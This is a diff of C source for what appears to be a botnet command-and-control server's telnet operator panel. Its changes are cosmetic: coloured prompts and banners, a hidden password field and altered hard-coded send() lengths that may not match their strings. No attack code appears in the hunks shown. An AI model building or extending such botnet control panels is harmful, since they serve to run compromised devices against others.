@@ -149,7 +149,7 @@ void broadcast(char *msg, int us, char *sender)
                         send(i, ": ", 2, MSG_NOSIGNAL); 
                 }
                 send(i, msg, strlen(msg), MSG_NOSIGNAL);
-                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 45, MSG_NOSIGNAL);
+                if(sendMGM && managements[i].connected) send(i, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 99, MSG_NOSIGNAL);
                 else send(i, "\n", 1, MSG_NOSIGNAL);
         }
         free(wot);
@@ -378,9 +378,9 @@ void *telnetWorker(void *sock) {
             fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
             ++j;
         }
-        sprintf(botnet, "\x1b[45mWelcome User\r\n");
+        sprintf(botnet, "\x1b[99mWelcome User\r\n");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
-		sprintf(botnet, "Username: ");
+		sprintf(botnet, "Username\033[33;3m: ");
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
         if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
         trim(buf);
@@ -389,7 +389,7 @@ void *telnetWorker(void *sock) {
         find_line = Search_in_File(nickstring);
 
         if(strcmp(nickstring, accounts[find_line].id) == 0){                  
-        sprintf(botnet, "Password: "); 
+        sprintf(botnet, "Password\033[33;3m: \e[0;30m"); 
         if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
         if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
         trim(buf);
@@ -426,7 +426,7 @@ void *telnetWorker(void *sock) {
         	if(send(thefd, banner4, strlen(banner4), MSG_NOSIGNAL) == -1) goto end;
 		if(send(thefd, banner9, strlen(banner9), MSG_NOSIGNAL) == -1) goto end;
 		while(1) {
-		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 45, MSG_NOSIGNAL) == -1) goto end;
+		if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m#\e[38;2;89;255;0m", 99, MSG_NOSIGNAL) == -1) goto end;
 		break;
 		}
         pthread_create(&title, NULL, &titleWriter, sock);
